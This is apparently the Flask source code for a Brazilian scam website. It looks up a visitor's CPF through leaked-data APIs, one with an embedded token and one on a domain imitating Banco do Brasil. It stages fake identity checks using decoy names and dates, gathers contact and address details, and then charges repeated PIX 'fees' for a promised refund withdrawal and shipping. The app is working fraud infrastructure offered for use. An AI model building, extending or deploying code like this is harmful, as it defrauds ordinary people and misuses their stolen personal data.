# Imports e configuração básica
import os
import requests
import logging
import random
import gzip
import json
from datetime import datetime, timedelta
from typing import Dict, Any, List
from flask import Flask, render_template, url_for, request, redirect, flash, session, jsonify, after_this_request
from flask_caching import Cache
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from services.payment_api import create_payment_api # Added import statement

# Add format_phone_number function after imports
def format_phone_number(phone: str) -> str:
    """Format phone number to match API requirements"""
    # Remove all non-digits
    clean_phone = ''.join(filter(str.isdigit, phone))
    # Remove country code if present
    if clean_phone.startswith('55'):
        clean_phone = clean_phone[2:]
    return clean_phone


# Configuração do logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Verificação das variáveis de ambiente
database_url = os.environ.get("DATABASE_URL")
if not database_url:
    raise ValueError("DATABASE_URL environment variable is not set")
logger.info(f"Database URL found: {database_url.split(':')[0]}")

# Inicialização do Flask e configurações
app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY")
app.static_folder = 'static'

# Configuração do cache
cache = Cache(app, config={
    'CACHE_TYPE': 'simple',
    'CACHE_DEFAULT_TIMEOUT': 600
})

# Configuração do SQLAlchemy
app.config["SQLALCHEMY_DATABASE_URI"] = database_url
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_size": 5,
    "max_overflow": 10,
    "pool_timeout": 30,
    "pool_recycle": 300,
    "pool_pre_ping": True,
}
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

logger.info("Initializing SQLAlchemy with configuration")
# Inicialização do SQLAlchemy e Flask-Migrate
db = SQLAlchemy(app)
migrate = Migrate(app, db)
logger.info("SQLAlchemy and Flask-Migrate initialized successfully")

# Importa os modelos após a inicialização do db
from models import Usuario, Pagamento  # noqa

# Cria as tabelas no banco de dados
with app.app_context():
    try:
        logger.info("Attempting to create database tables")
        db.create_all()
        logger.info("Database tables created successfully")
    except Exception as e:
        logger.error(f"Error creating database tables: {str(e)}")
        raise

# Middleware de compressão
def gzip_response(response):
    # Não comprimir arquivos estáticos
    if request.path.startswith('/static/'):
        return response

    accept_encoding = request.headers.get('Accept-Encoding', '')
    if 'gzip' not in accept_encoding.lower():
        return response

    if (response.status_code < 200 or response.status_code >= 300 or
        'Content-Encoding' in response.headers):
        return response

    # Só comprimir se a resposta tiver dados
    if not response.data:
        return response

    try:
        gzip_buffer = gzip.compress(response.data)
        response.data = gzip_buffer
        response.headers['Content-Encoding'] = 'gzip'
        response.headers['Content-Length'] = len(response.data)
    except Exception as e:
        logger.error(f"Erro na compressão: {str(e)}")
        return response

    return response

@app.after_request
def after_request(response):
    return gzip_response(response)

API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"

ESTADOS = {
    'Acre': 'AC',
    'Alagoas': 'AL',
    'Amapá': 'AP',
    'Amazonas': 'AM',
    'Bahia': 'BA',
    'Ceará': 'CE',
    'Distrito Federal': 'DF',
    'Espírito Santo': 'ES',
    'Goiás': 'GO',
    'Maranhão': 'MA',
    'Mato Grosso': 'MT',
    'Mato Grosso do Sul': 'MS',
    'Minas Gerais': 'MG',
    'Pará': 'PA',
    'Paraíba': 'PB',
    'Paraná': 'PR',
    'Pernambuco': 'PE',
    'Piauí': 'PI',
    'Rio de Janeiro': 'RJ',
    'Rio Grande do Norte': 'RN',
    'Rio Grande do Sul': 'RS',
    'Rondônia': 'RO',
    'Roraima': 'RR',
    'Santa Catarina': 'SC',
    'São Paulo': 'SP',
    'Sergipe': 'SE',
    'Tocantins': 'TO'
}

# Adiciona dicionário de companhias elétricas por estado
COMPANHIAS_ELETRICAS = {
    'AC': [{'id': 'energisa_ac', 'nome': 'Energisa Acre'}],
    'AL': [{'id': 'equatorial_al', 'nome': 'Equatorial Alagoas'}],
    'AM': [{'id': 'amazonas_energia', 'nome': 'Amazonas Energia'}],
    'AP': [{'id': 'cea', 'nome': 'Companhia de Eletricidade do Amapá'}],
    'BA': [{'id': 'neoenergia_ba', 'nome': 'Neoenergia Coelba'}],
    'CE': [{'id': 'enel_ce', 'nome': 'Enel Ceará'}],
    'DF': [{'id': 'neoenergia_df', 'nome': 'Neoenergia Distribuição Brasília'}],
    'ES': [{'id': 'edp_es', 'nome': 'EDP Espírito Santo'}],
    'GO': [{'id': 'enel_go', 'nome': 'Enel Goiás'}],
    'MA': [{'id': 'equatorial_ma', 'nome': 'Equatorial Maranhão'}],
    'MT': [{'id': 'energisa_mt', 'nome': 'Energisa Mato Grosso'}],
    'MS': [{'id': 'energisa_ms', 'nome': 'Energisa Mato Grosso do Sul'}],
    'MG': [{'id': 'cemig', 'nome': 'CEMIG Distribuição'}],
    'PA': [{'id': 'equatorial_pa', 'nome': 'Equatorial Pará'}],
    'PB': [{'id': 'energisa_pb', 'nome': 'Energisa Paraíba'}],
    'PR': [{'id': 'copel', 'nome': 'COPEL Distribuição'}],
    'PE': [{'id': 'neoenergia_pe', 'nome': 'Neoenergia Pernambuco (CELPE)'}],
    'PI': [{'id': 'equatorial_pi', 'nome': 'Equatorial Piauí'}],
    'RJ': [
        {'id': 'light', 'nome': 'Light'},
        {'id': 'enel_rj', 'nome': 'Enel Rio'}
    ],
    'RN': [{'id': 'neoenergia_rn', 'nome': 'Neoenergia Cosern'}],
    'RS': [{'id': 'rge_sul', 'nome': 'RGE Sul'}],
    'RO': [{'id': 'energisa_ro', 'nome': 'Energisa Rondônia'}],
    'RR': [{'id': 'roraima_energia', 'nome': 'Roraima Energia'}],
    'SC': [{'id': 'celesc', 'nome': 'CELESC Distribuição'}],
    'SP': [
        {'id': 'enel_sp', 'nome': 'Enel São Paulo'},
        {'id': 'cpfl_paulista', 'nome': 'CPFL Paulista'},
        {'id': 'elektro', 'nome': 'Neoenergia Elektro'},
        {'id': 'edp_sp', 'nome': 'EDP São Paulo'}
    ],
    'SE': [{'id': 'energisa_se', 'nome': 'Energisa Sergipe'}],
    'TO': [{'id': 'energisa_to', 'nome': 'Energisa Tocantins'}]
}

def get_estado_from_ip(ip_address: str) -> str:
    """
    Obtém o estado baseado no IP do usuário usando um serviço de geolocalização
    """
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success' and data.get('country') == 'Brazil':
                estado = data.get('region')
                # Procura o estado no dicionário de mapeamento
                for estado_nome, sigla in ESTADOS.items():
                    if sigla == estado:
                        return f"{estado_nome} - {sigla}"
    except Exception as e:
        logger.error(f"Erro ao obter localização do IP: {str(e)}")

    # Se não conseguir determinar o estado, retorna São Paulo como padrão
    return "São Paulo - SP"

def get_client_ip() -> str:
    """
    Obtém o IP do cliente, considerando possíveis proxies
    """
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        ip = request.remote_addr
    return ip

def gerar_nomes_falsos(nome_real: str) -> list:
    nomes = [
        "MARIA SILVA SANTOS",
        "JOSE OLIVEIRA SOUZA",
        "ANA PEREIRA LIMA",
        "JOAO FERREIRA COSTA",
        "ANTONIO RODRIGUES ALVES",
        "FRANCISCO GOMES SILVA",
        "CARLOS SANTOS OLIVEIRA",
        "PAULO RIBEIRO MARTINS",
        "PEDRO ALMEIDA COSTA",
        "LUCAS CARVALHO LIMA"
    ]
    # Remove nomes que são muito similares ao nome real
    nomes = [n for n in nomes if len(set(n.split()) & set(nome_real.split())) == 0]
    # Seleciona 2 nomes aleatórios
    nomes_falsos = random.sample(nomes, 2)
    # Adiciona o nome real e embaralha
    todos_nomes = nomes_falsos + [nome_real]
    random.shuffle(todos_nomes)
    return todos_nomes

# Função auxiliar para gerar datas falsas
def gerar_datas_falsas(data_real_str: str) -> List[str]:
    data_real = datetime.strptime(data_real_str.split()[0], '%Y-%m-%d')
    datas_falsas = []

    for _ in range(2):
        dias = random.randint(-365*2, 365*2)
        data_falsa = data_real + timedelta(days=dias)
        datas_falsas.append(data_falsa)

    todas_datas = datas_falsas + [data_real]
    random.shuffle(todas_datas)

    return [data.strftime('%d/%m/%Y') for data in todas_datas]

@app.route('/consultar_cpf', methods=['POST'])
def consultar_cpf():
    cpf = request.form.get('cpf', '').strip()
    cpf_numerico = ''.join(filter(str.isdigit, cpf))

    if not cpf_numerico or len(cpf_numerico) != 11:
        flash('CPF inválido. Por favor, digite um CPF válido.')
        return redirect(url_for('index'))

    try:
        response = requests.get(
            API_URL.format(cpf=cpf_numerico),
            timeout=30
        )
        response.raise_for_status()
        dados = response.json()

        if dados and 'DADOS' in dados and 'NOME' in dados['DADOS']:
            dados_usuario = {
                'cpf': cpf_numerico,
                'nome_real': dados['DADOS']['NOME'],
                'data_nasc': dados['DADOS']['NASC'],
                'nomes': gerar_nomes_falsos(dados['DADOS']['NOME'])
            }
            session['dados_usuario'] = dados_usuario
            return render_template('verificar_nome.html',
                                dados=dados_usuario,
                                current_year=datetime.now().year)
        else:
            flash('CPF não encontrado ou dados incompletos.')
            return redirect(url_for('index'))

    except Exception as e:
        logger.error(f"Erro na consulta: {str(e)}")
        flash('Erro ao consultar CPF. Por favor, tente novamente.')
        return redirect(url_for('index'))

@app.route('/verificar_nome', methods=['POST'])
def verificar_nome():
    nome_selecionado = request.form.get('nome')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not nome_selecionado:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    if nome_selecionado != dados_usuario['nome_real']:
        flash('Nome selecionado incorreto. Por favor, tente novamente.')
        return redirect(url_for('index'))

    # Gera datas falsas para a próxima etapa
    datas = gerar_datas_falsas(dados_usuario['data_nasc'])
    dados_usuario['datas'] = datas
    session['dados_usuario'] = dados_usuario

    return render_template('verificar_data.html',
                         dados=dados_usuario,
                         current_year=datetime.now().year)

@app.route('/verificar_data', methods=['POST'])
def verificar_data():
    data_selecionada = request.form.get('data')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not data_selecionada:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    data_real = datetime.strptime(dados_usuario['data_nasc'].split()[0], '%Y-%m-%d').strftime('%d/%m/%Y')
    if data_selecionada != data_real:
        flash('Data selecionada incorreta. Por favor, tente novamente.')
        return redirect(url_for('index'))

    # Obtém o estado baseado no IP do usuário
    ip_address = get_client_ip()
    estado_detectado = get_estado_from_ip(ip_address)
    logger.info(f"Estado detectado para IP {ip_address}: {estado_detectado}")

    return render_template('confirmar_dados.html',
                         estado_detectado=estado_detectado,
                         companhias=COMPANHIAS_ELETRICAS.get(estado_detectado[:2], []),
                         current_year=datetime.now().year)

@app.route('/api/companhias/<estado>')
def get_companhias(estado):
    """Retorna a lista de companhias elétricas para um estado específico"""
    companhias = COMPANHIAS_ELETRICAS.get(estado.upper(), [])
    return jsonify(companhias)

@app.route('/confirmar_dados', methods=['POST'])
def confirmar_dados():
    estado = request.form.get('estado')
    companhia_id = request.form.get('companhia')
    email = request.form.get('email')
    telefone = request.form.get('telefone')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not estado or not companhia_id or not email or not telefone:
        flash('Sessão expirada ou dados incompletos. Por favor, tente novamente.')
        return redirect(url_for('index'))

    # Encontra o nome da companhia selecionada
    companhias = COMPANHIAS_ELETRICAS.get(estado, [])
    companhia_nome = next((c['nome'] for c in companhias if c['id'] == companhia_id), None)

    if not companhia_nome:
        flash('Companhia elétrica inválida. Por favor, tente novamente.')
        return render_template('confirmar_dados.html',
                            estado_detectado=estado,
                            companhias=companhias,
                            current_year=datetime.now().year)

    # Salva os dados de localização e contato na sessão
    dados_usuario['estado'] = estado
    dados_usuario['companhia'] = {
        'id': companhia_id,
        'nome': companhia_nome
    }
    dados_usuario['email'] = email
    dados_usuario['telefone'] = telefone
    session['dados_usuario'] = dados_usuario

    # Redireciona para a página de análise
    return redirect(url_for('analise_dados'))


@app.route('/analise_dados')
def analise_dados():
    """Rota para a página de análise de dados e aprovação"""
    user_data = session.get('dados_usuario')
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    return render_template('analise_dados.html',
                         user_data=user_data,
                         current_year=datetime.now().year)


@app.route('/retirada_restituicao')
def retirada_restituicao():
    """Rota para a página de retirada da restituição"""
    user_data = session.get('dados_usuario')
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    return render_template('retirada_restituicao.html',
                         user_data=user_data,
                         current_year=datetime.now().year)

@app.route('/processar_retirada', methods=['POST'])
def processar_retirada():
    """Rota para processar a solicitação de retirada"""
    user_data = session.get('dados_usuario')
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('retirada_restituicao'))

    confirma_dados = request.form.get('confirma_dados')
    if not confirma_dados:
        flash('É necessário confirmar os dados para prosseguir.')
        return redirect(url_for('retirada_restituicao'))

    return render_template('processando_retirada.html',
                         user_data=user_data,
                         current_year=datetime.now().year)

@app.route('/selecionar_estado', methods=['POST'])
def selecionar_estado():
    estado = request.form.get('estado')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not estado:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    # Salva o estado selecionado na sessão
    dados_usuario['estado'] = estado
    session['dados_usuario'] = dados_usuario

    # Redireciona para a seleção de nível, passando o estado selecionado
    return render_template('selecionar_nivel.html', 
                         estado=estado,
                         current_year=datetime.now().year)

@app.route('/selecionar_nivel', methods=['POST'])
def selecionar_nivel():
    nivel = request.form.get('nivel')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not nivel:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    # Salva o nível selecionado na sessão
    dados_usuario['nivel'] = nivel
    session['dados_usuario'] = dados_usuario

    # Redireciona para a página de contato
    return render_template('verificar_contato.html',
                         dados={
                             'name': dados_usuario['nome_real'],
                             'cpf': dados_usuario['cpf'],
                             'estado': dados_usuario['estado']
                         },
                         current_year=datetime.now().year)

@app.route('/verificar_contato', methods=['POST'])
def verificar_contato():
    email = request.form.get('email')
    telefone = request.form.get('telefone')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not email or not telefone:
        flash('Sessão expirada ou dados incompletos. Por favor, tente novamente.')
        return redirect(url_for('index'))

    # Adiciona os dados de contato ao objeto dados_usuario
    dados_usuario['email'] = email
    dados_usuario['phone'] = ''.join(filter(str.isdigit, telefone))  # Remove formatação
    session['dados_usuario'] = dados_usuario

    # Redireciona para a página de endereço
    return redirect(url_for('verificar_endereco'))

@app.route('/verificar_endereco', methods=['GET', 'POST'])
def verificar_endereco():
    dados_usuario = session.get('dados_usuario')
    if not dados_usuario:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    if request.method == 'POST':
        # Coleta os dados do formulário
        endereco = {
            'cep': request.form.get('cep'),
            'logradouro': request.form.get('logradouro'),
            'numero': request.form.get('numero'),
            'complemento': request.form.get('complemento'),
            'bairro': request.form.get('bairro'),
            'cidade': request.form.get('cidade'),
            'estado': request.form.get('estado')
        }

        # Valida se os campos obrigatórios foram preenchidos
        campos_obrigatorios = ['cep', 'logradouro', 'numero', 'bairro', 'cidade', 'estado']
        if not all(endereco.get(campo) for campo in campos_obrigatorios):
            flash('Por favor, preencha todos os campos obrigatórios.')
            return render_template('verificar_endereco.html', 
                                current_year=datetime.now().year)

        # Adiciona o endereço aos dados do usuário
        dados_usuario['endereco'] = endereco
        session['dados_usuario'] = dados_usuario

        # Redireciona para a página de aviso de pagamento
        return render_template('aviso_pagamento.html',
                            dados={'name': dados_usuario['nome_real'],
                                  'email': dados_usuario['email'],
                                  'phone': dados_usuario['phone'],
                                  'cpf': dados_usuario['cpf']},
                            current_year=datetime.now().year,
                            current_month=str(datetime.now().month).zfill(2),
                            current_day=str(datetime.now().day).zfill(2))

    # GET request - mostra o formulário
    return render_template('verificar_endereco.html',
                         current_year=datetime.now().year)


@app.route('/pagamento', methods=['GET', 'POST'])
def pagamento():
    try:
        user_data = session.get('dados_usuario')
        if not user_data:
            flash('Sessão expirada. Por favor, faça a consulta novamente.')
            return render_template('pagamento.html',
                               error="Sessão expirada",
                               current_year=datetime.now().year)

        payment_api = create_payment_api()

        # Formata o telefone adequadamente
        phone = format_phone_number(user_data.get('telefone', ''))

        # Garante que temos um email válido
        email = user_data.get('email', '')
        if not email or '@' not in email:
            email = f"user_{user_data['cpf']}@email.com"
            logger.info(f"Generated email for user: {email}")

        payment_data = {
            'name': user_data['nome_real'],
            'email': email,
            'cpf': user_data['cpf'],
            'phone': phone,
            'amount': 78.40
        }

        logger.info(f"Enviando dados para API de pagamento: {payment_data}")

        try:
            pix_data = payment_api.create_pix_payment(payment_data)
            logger.info(f"Resposta da API de pagamento: {pix_data}")

            return render_template('pagamento.html',
                               pix_data=pix_data,
                               valor_total="78,40",
                               current_year=datetime.now().year)
        except Exception as e:
            logger.error(f"Erro específico na criação do PIX: {str(e)}")
            return render_template('pagamento.html',
                               error=f"Erro ao gerar PIX: {str(e)}",
                               current_year=datetime.now().year)

    except Exception as e:
        logger.error(f"Erro geral na rota de pagamento: {str(e)}")
        return render_template('pagamento.html',
                           error=f"Erro ao processar pagamento: {str(e)}",
                           current_year=datetime.now().year)

@app.route('/check_payment/<payment_id>')
def check_payment(payment_id):
    try:
        payment_api = create_payment_api()
        status_data = payment_api.check_payment_status(payment_id)
        return jsonify(status_data)
    except Exception as e:
        logger.error(f"Error checking payment status: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/')
@cache.cached(timeout=60)  # Cache da página inicial por 1 minuto
def index():
    today = datetime.now()
    logger.debug(f"Current date - Year: {today.year}, Month: {today.month}, Day: {today.day}")
    return render_template('index.html', 
                         current_year=today.year,
                         current_month=str(today.month).zfill(2),
                         current_day=str(today.day).zfill(2))


@app.route('/frete_apostila', methods=['GET', 'POST'])
def frete_apostila():
    user_data = session.get('dados_usuario') 
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    if request.method == 'POST':
        try:
            # Coleta os dados do formulário
            endereco = {
                'cep': request.form.get('cep'),
                'logradouro': request.form.get('street'),
                'numero': request.form.get('number'),
                'complemento': request.form.get('complement'),
                'bairro': request.form.get('neighborhood'),
                'cidade': request.form.get('city'),
                'estado': request.form.get('state')
            }

            # Valida se os campos obrigatórios foram preenchidos
            campos_obrigatorios = ['cep', 'logradouro', 'numero', 'bairro', 'cidade', 'estado']
            if not all(endereco.get(campo) for campo in campos_obrigatorios):
                flash('Por favor, preencha todos os campos obrigatórios.')
                return render_template('frete_apostila.html', 
                                   user_data=user_data,
                                   current_year=datetime.now().year)

            # Salva o endereço na sessão
            user_data['endereco'] = endereco
            session['dados_usuario'] = user_data

            # Gera o pagamento PIX
            payment_api = create_payment_api()
            payment_data = {
                'name': user_data['nome_real'], 
                'email': user_data.get('email', generate_random_email()), 
                'cpf': user_data['cpf'],
                'phone': user_data.get('phone', generate_random_phone()), 
                'amount': 48.19  # Valor do frete
            }

            pix_data = payment_api.create_pix_payment(payment_data)
            return render_template('pagamento.html',
                               pix_data=pix_data,
                               valor_total="48,19",
                               current_year=datetime.now().year)

        except Exception as e:
            logger.error(f"Erro ao processar formulário: {e}")
            flash('Erro ao processar o formulário. Por favor, tente novamente.')
            return redirect(url_for('frete_apostila'))

    return render_template('frete_apostila.html', 
                        user_data=user_data,
                        current_year=datetime.now().year)

@app.route('/pagamento_categoria', methods=['POST'])
def pagamento_categoria():
    user_data = session.get('dados_usuario') 
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return render_template('pagamento_categoria.html',
                           error="Sessão expirada",
                           current_year=datetime.now().year)

    categoria = request.form.get('categoria')
    if not categoria:
        return render_template('pagamento_categoria.html',
                           error="Categoria não especificada",
                           current_year=datetime.now().year)

    try:
        payment_api = create_payment_api()
        payment_data = {
            'name': user_data['nome_real'], 
            'email': user_data.get('email', generate_random_email()), 
            'cpf': user_data['cpf'],
            'phone': user_data.get('phone', generate_random_phone()), 
            'amount': 114.10  
        }

        pix_data = payment_api.create_pix_payment(payment_data)
        return render_template('pagamento_categoria.html',
                           pix_data=pix_data,
                           valor_total="114,10",
                           categoria=categoria,
                           current_year=datetime.now().year)

    except Exception as e:
        logger.error(f"Erro ao gerar pagamento da categoria: {e}")
        return render_template('pagamento_categoria.html',
                           error=f"Erro ao gerar pagamento: {str(e)}",
                           categoria=categoria,
                           current_year=datetime.now().year)

@app.route('/obrigado')
@cache.cached(timeout=300)  # Cache por 5 minutos
def obrigado():
    user_data = session.get('dados_usuario') 
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))
    return render_template('obrigado.html', 
                         current_year=datetime.now().year,
                         user_data=user_data)

@app.route('/categoria/<tipo>')
def categoria(tipo):
    user_data = session.get('dados_usuario')
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))
    return render_template(f'categoria_{tipo}.html', 
                         current_year=datetime.now().year,
                         user_data=user_data)

@app.route('/taxa')
@cache.cached(timeout=300)  # Cache por 5 minutos
def taxa():
    return render_template('taxa.html', current_year=datetime.now().year)

@app.route('/verificar_taxa', methods=['POST'])
def verificar_taxa():
    cpf = request.form.get('cpf', '').strip()
    cpf_numerico =''.join(filter(str.isdigit, cpf))

    if not cpf_numerico or len(cpf_numerico) !=11:
        flash('CPF inválido. Por favor, digite um CPF válido.')
        return redirect(url_for('taxa'))

    try:
        # Consulta à API
        response = requests.get(
            f"https://inscricao-bb.org/api_clientes.php?cpf={cpf_numerico}",
            timeout=30
        )
        response.raise_for_status()
        dados = response.json()

        if dados and 'name' in dados:
            session['dados_taxa'] = dados

            # Generate PIX payment
            try:
                payment_api = create_payment_api()
                payment_data = {
                    'name': dados['name'],
                    'email': dados['email'],
                    'cpf': dados['cpf'],
                    'phone': dados['phone'],
                    'amount': 82.10
                }

                logger.info(f"Generating PIX payment for CPF: {cpf_numerico}")
                pix_data = payment_api.create_pix_payment(payment_data)
                logger.info(f"PIX data generated successfully: {pix_data}")

                return render_template('taxa_pendente.html',
                                    dados=dados,
                                    pix_data=pix_data,
                                    current_year=datetime.now().year)
            except Exception as e:
                logger.error(f"Erro ao gerar pagamento: {e}")
                flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
                return redirect(url_for('taxa'))
        else:
            flash('CPF não encontrado ou dados incompletos.')
            return redirect(url_for('taxa'))

    except Exception as e:
        logger.error(f"Erro na consulta: {str(e)}")
        flash('Erro ao consultar CPF. Por favor, tente novamente.')
        return redirect(url_for('taxa'))

@app.route('/pagamento_taxa', methods=['POST'])
def pagamento_taxa():
    dados = session.get('dados_taxa')
    if not dados:
        return render_template('pagamento.html',
                           error="Sessão expirada",
                           current_year=datetime.now().year)

    try:
        payment_api = create_payment_api()
        payment_data = {
            'name': dados['name'],
            'email': dados['email'],
            'cpf': dados['cpf'],
            'phone': dados['phone'],
            'amount': 82.10
        }

        pix_data = payment_api.create_pix_payment(payment_data)
        return render_template('pagamento.html',
                           pix_data=pix_data,
                           valor_total="82,10",
                           current_year=datetime.now().year)

    except Exception as e:
        logger.error(f"Erro ao gerar pagamento: {e}")
        return render_template('pagamento.html',
                           error=f"Erro ao gerar pagamento: {str(e)}",
                           current_year=datetime.now().year)

def generate_random_email():
    return f"user_{random.randint(1,1000)}@example.com"

def generate_random_phone() -> str:
    """
    Gera um número de telefone aleatório no formato brasileiro aceito pela API
    """
    ddd = str(random.randint(11, 99))
    # Gera 8 dígitos para o número (sem o 9 na frente)
    numero = ''.join([str(random.randint(0, 9)) for _ in range(8)])
    return f"55{ddd}{numero}"

def generate_random_email() -> str:
    """
    Gera um email aleatório para casos onde o usuário não forneceu
    """
    random_string = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
    return f"{random_string}@temp-mail.org"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)